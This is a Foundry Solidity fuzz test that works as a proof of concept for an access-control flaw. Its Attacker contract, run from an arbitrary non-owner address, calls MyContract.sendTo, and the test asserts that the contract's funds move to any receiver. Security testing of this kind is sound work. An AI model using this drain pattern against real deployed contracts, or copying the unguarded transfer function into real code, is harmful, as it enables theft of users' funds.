
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract Attacker {
    function attack(MyContract target, address payable receiver, uint amount) public {
        target.sendTo(receiver, amount);
    }
}

contract TestAccessControlMyContract is Test {
    MyContract public myContract;
    address internal owner;

    function setUp() public {
        owner = makeAddr("owner");
        vm.prank(owner);
        myContract = new MyContract();
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint256 amount) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));

        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        vm.assume(caller != owner);
        vm.assume(caller != address(myContract));
        vm.assume(receiver != address(0));
        vm.assume(amount > 0);
        vm.assume(caller.code.length == 0);
        vm.assume(receiver.code.length == 0);

        // --- 2. State Configuration ---
        
        vm.deal(address(myContract), amount);
        
        // --- 3. Execution & Assertion ---
        
        uint256 contractBalanceBefore = address(myContract).balance;
        uint256 receiverBalanceBefore = receiver.balance;

        vm.etch(caller, type(Attacker).runtimeCode);

        vm.prank(owner);

        Attacker(caller).attack(myContract, receiver, amount);

        assertEq(address(myContract).balance, contractBalanceBefore - amount);
        assertEq(receiver.balance, receiverBalanceBefore + amount);
    }
}
